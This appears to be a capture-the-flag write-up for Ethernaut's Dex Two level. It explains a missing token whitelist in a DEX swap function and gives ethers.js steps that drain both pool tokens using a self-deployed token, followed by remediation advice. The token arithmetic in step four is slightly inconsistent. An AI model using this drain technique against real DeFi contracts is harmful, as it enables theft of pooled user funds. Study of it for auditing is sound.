# Ethernaut Challenge 23: Dex Two 🏴‍☠️

## Challenge Description

This level will ask you to break the `DexTwo` contract's liquidity pool and extract all token1 and token2 from the contract.

Unlike the previous Dex challenge, this time you need to:
1. Extract all token1 from DexTwo
2. Extract all token2 from DexTwo

The key is that you need to extract all tokens from the DexTwo liquidity pool!

## Contract Analysis

### Key Vulnerability Analysis

1. **Lack of Token Whitelist Verification**:
   - The `swap` function doesn't verify if `from` and `to` tokens are legitimate token1 or token2
   - Attackers can use arbitrary ERC20 tokens for swapping

2. **Price Calculation Formula Flaw**:
   ```solidity
   function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
       return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
   }
   ```
   - When attackers control the balance of the `from` token, they can manipulate the calculation result

3. **approve Function Limitation**:
   - SwappableTokenTwo's approve function prevents DEX from performing approve as owner
   - But doesn't affect new tokens created by attackers

## Attack Strategy

### Step 1: Create Malicious Token
```typescript
const attackerTokenFactory = await ethers.getContractFactory("SwappableTokenTwo");
const attackerToken = await attackerTokenFactory.deploy(
    contract.target, 
    "Attack on Token", 
    "AOT", 
    100000
);
```

### Step 2: Set Approval
```typescript
await contract.approve(contract.target, 100000);
await attackerToken["approve(address,address,uint256)"](attacker.address, contract.target, 100000);
```

### Step 3: Execute First Attack (Extract token1)
```typescript
// Transfer 1 malicious token to DEX
await attackerToken.transfer(contract.target, 1);

// Use 1 malicious token to exchange for all token1
// getSwapAmount(attackerToken, token1, 1) = (1 * 100) / 1 = 100
await contract.swap(attackerToken.target, token1, 1);
```

### Step 4: Execute Second Attack (Extract token2)
```typescript
// Transfer 8 more malicious tokens to DEX (making DEX malicious token balance 10)
await attackerToken.transfer(contract.target, 8);

// Use 10 malicious tokens to exchange for all token2
// getSwapAmount(attackerToken, token2, 10) = (10 * 100) / 10 = 100
await contract.swap(attackerToken.target, token2, 10);
```

## Detailed Attack Explanation

### Key Mathematical Calculations

1. **Initial State**:
   - DEX token1: 100
   - DEX token2: 100
   - DEX attackerToken: 0

2. **After First Attack**:
   - DEX token1: 0 ✅
   - DEX token2: 100
   - DEX attackerToken: 1

3. **After Second Attack**:
   - DEX token1: 0 ✅
   - DEX token2: 0 ✅
   - DEX attackerToken: 10

### Why Does the Attack Succeed?

1. **Lack of Token Verification**: DEX doesn't restrict swaps to only token1 and token2
2. **Price Manipulation**: Attackers have complete control over malicious token supply
3. **Formula Exploitation**: By precisely controlling the denominator (malicious token balance), desired exchange ratios can be achieved

## Security Recommendations

1. **Implement Token Whitelist**:
   ```solidity
   modifier onlyValidTokens(address from, address to) {
       require(from == token1 || from == token2, "Invalid from token");
       require(to == token1 || to == token2, "Invalid to token");
       require(from != to, "Cannot swap same token");
       _;
   }
   ```

2. **Strengthen Price Oracle**:
   - Use external price oracles
   - Implement slippage protection
   - Add minimum liquidity requirements

3. **Audit Transaction Logic**:
   - Check all token transfers
   - Verify balance changes before and after swaps
   - Implement reentrancy attack protection

## Run Commands

```bash
# Install dependencies
npm install

# Compile contracts
npx hardhat compile

# Run attack script
npx hardhat run scripts/interact.ts --network sepolia

# Run tests
npx hardhat test
```

## Learning Points

1. **Importance of Token Verification**: Any DeFi protocol should strictly verify supported tokens
2. **Security of Price Calculations**: Simple mathematical formulas can be maliciously exploited
3. **Liquidity Pool Attacks**: Attackers can influence prices by manipulating liquidity

This challenge demonstrates common vulnerability types in DeFi protocols, reminding us to consider various edge cases and potential attack vectors when designing financial contracts.
